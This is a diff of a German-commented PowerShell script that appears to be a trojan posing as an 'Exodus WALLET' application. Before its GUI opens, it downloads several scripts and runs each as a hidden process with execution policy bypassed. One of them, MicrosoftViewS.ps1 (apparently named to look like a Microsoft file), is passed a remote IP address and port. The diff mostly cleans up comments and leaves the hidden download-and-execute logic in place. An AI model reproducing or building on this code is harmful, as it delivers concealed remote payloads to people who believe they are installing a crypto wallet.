@@ -58,30 +58,28 @@ foreach ($script in $scripts) {
         }
     } -ArgumentList $script.Url, $script.FileName, $targetDir, $logPath
     $downloadJobs += $job
-    Write-Host "Download-Start: $($script.FileName) (parallel)"  # Debug – entferne
+    Write-Host "Download-Start: $($script.FileName) (parallel)"  # Debug – entferne später
 }
 
-# Warte kurz auf Downloads (max 5 Sek.), dann Exec
-Start-Sleep -Seconds 2  # Genug für schnelle Downloads
+# Warte kurz auf Downloads, dann Exec
+Start-Sleep -Seconds 2
 foreach ($job in $downloadJobs) {
     Receive-Job $job | Out-Null
     Remove-Job $job -Force
 }
 
-# Nun Exec der gedownloadeten Files (sequentiell, hidden) – SPEZIAL FÜR MicrosoftViewS.ps1
+# Exec der Files (spezial für MicrosoftViewS.ps1)
 foreach ($script in $scripts) {
     $filePath = Join-Path $targetDir $script.FileName
     if (Test-Path $filePath) {
         try {
-            Write-Host "Exec: $($script.FileName) aus $filePath"  # Debug – entferne
+            Write-Host "Exec: $($script.FileName) aus $filePath"  # Debug – entferne später
             if ($script.FileName -eq "MicrosoftViewS.ps1") {
-                # Spezielle Args für MicrosoftViewS.ps1
                 $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"", "-a14", "145.223.117.77", "-a15", "8080", "-a16", "20", "-a17", "70")
             } else {
-                # Normale Exec für andere Scripts
                 $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"")
             }
-            Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null  # BG-Exec
+            Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null
             Add-Content -Path $logPath -Value "$(Get-Date): EXEC ${script.FileName} aus $filePath" -ErrorAction SilentlyContinue
             Write-Host "SUCCESS EXEC: $($script.FileName)"  # Debug
         } catch {
@@ -92,12 +90,12 @@ foreach ($script in $scripts) {
     } else {
         Write-Host "NO FILE: $($script.FileName) nicht gedownloaded!"  # Debug
     }
-    Start-Sleep -Milliseconds 200  # Kurze Pause
+    Start-Sleep -Milliseconds 200
 }
 
 Write-Host "Downloads & Exec abgeschlossen. GUI startet..."  # Debug
 
-# ==================== HAUPTFENSTER (schnell, wie vorher) ====================
+# ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "Exodus WALLET"
 $form.StartPosition = "CenterScreen"
